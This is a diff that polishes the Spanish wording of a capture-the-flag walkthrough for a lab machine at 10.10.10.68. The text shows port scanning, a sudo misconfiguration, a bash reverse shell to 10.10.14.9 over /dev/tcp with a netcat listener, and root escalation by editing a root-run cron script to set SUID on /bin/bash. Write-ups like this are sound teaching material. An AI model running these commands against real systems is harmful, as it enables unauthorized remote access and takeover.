@@ -22,7 +22,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.68 -oG allPorts
 
 ![image](images/20250430104350.png)
 
-Hacemos un escaneo exhaustivo sobre el puerto encontrado para conoces el servicio y la versión del mismo.
+Hacemos un escaneo exhaustivo sobre el puerto encontrado para conocer el servicio y su versión.
 
 ```bash
 nmap -p80 -sCV 10.10.10.68 -oN targeted
@@ -38,7 +38,7 @@ whatweb 10.10.10.68
 
 ![image](images/20250430104518.png)
 
-Vamos a la web a ver que nos encontramos.
+Accedemos a la web para ver qué encontramos.
 
 ![image](images/20250430104900.png)
 
@@ -64,17 +64,17 @@ Moviéndonos al directorio personal de `arrexel` encontramos la primera flag
 
 #### Escalada de privilegios
 
-Empezamos listando los permisos a nivel de `sudoer` para el usuario `www-data`
+Empezamos listando los permisos a nivel de `sudoers` para el usuario `www-data`
 
 ```bash
 sudo -l
 ```
 
-Vemos que podemos ejecutar comandos como el usuario `scriptmanager` sin proporcionar contraseña
+Vemos que podemos ejecutar comandos como el usuario `scriptmanager` sin necesidad de contraseña
 
 ![image](images/20250430110905.png)
 
-Probando:
+Podemos probar esto de la siguiente manera:
 
 ```bash
 sudo -u scriptmanager whoami
@@ -82,7 +82,7 @@ sudo -u scriptmanager whoami
 
 ![image](images/20250430112917.png)
 
-En este punto vamos a lanzarnos una shell a nuestra máquina para trabajar más cómodo
+En este punto, lanzamos una reverse shell a nuestra máquina para trabajar más cómodamente.
 
 ```bash
 bash -c "bash -i >%26 /dev/tcp/10.10.14.9/1234 0>%261"
@@ -94,7 +94,7 @@ nc -nlvp 1234
 
 ![image](images/20250430113217.png)
 
-Teniendo en cuenta lo anterior vamos a lanzar una `bash`
+Y lanzamos una bash como `scriptmanager`:
 
 ```bash
 sudo -u scriptmanager bash
@@ -102,7 +102,7 @@ sudo -u scriptmanager bash
 
 ![image](images/20250430113343.png)
 
-Vamos a buscar archivos cuyo propietario sea `scriptmanager`
+Buscamos archivos cuyo propietario sea `scriptmanager`
 
 ```bash
 find / -user scriptmanager 2>/dev/null | grep -v "proc"
@@ -118,11 +118,11 @@ cd scripts/
 
 ![image](images/20250430113847.png)
 
-Revisando su contenido y permisos parece que el usuario root está ejecutando una tarea programada:
+Revisando su contenido y permisos, parece que el usuario root está ejecutando una tarea programada:
 
 ![image](images/20250430114030.png)
 
-Con el siguiente script podemos visualizar en tiempo real si se están ejecutando tareas y el usuario que lo hace:
+Con el siguiente script podemos visualizar en tiempo real si se están ejecutando tareas y el usuario que las lanza:
 
 ![image](images/20250430120902.png)
 
@@ -144,7 +144,7 @@ chmod +x procmon.sh
 
 ![image](images/20250430115137.png)
 
-Tras ver que efectivamente se está haciendo así, vamos a modificar el archivo `test.py` para que el usuario root asigne permisos `SUID` a la bash
+Una vez confirmado que se ejecuta como root, modificamos el archivo `test.py` para asignar el bit `SUID` a `/bin/bash`:
 
 ```python
 import os
@@ -154,7 +154,7 @@ os.system("chmod u+s /bin/bash")
 
 ![image](images/20250430115825.png)
 
-Una vez que tiene los permisos la lanzamos con privilegios
+Y ejecutamos bash con privilegios elevados:
 
 ```bash
 bash -p
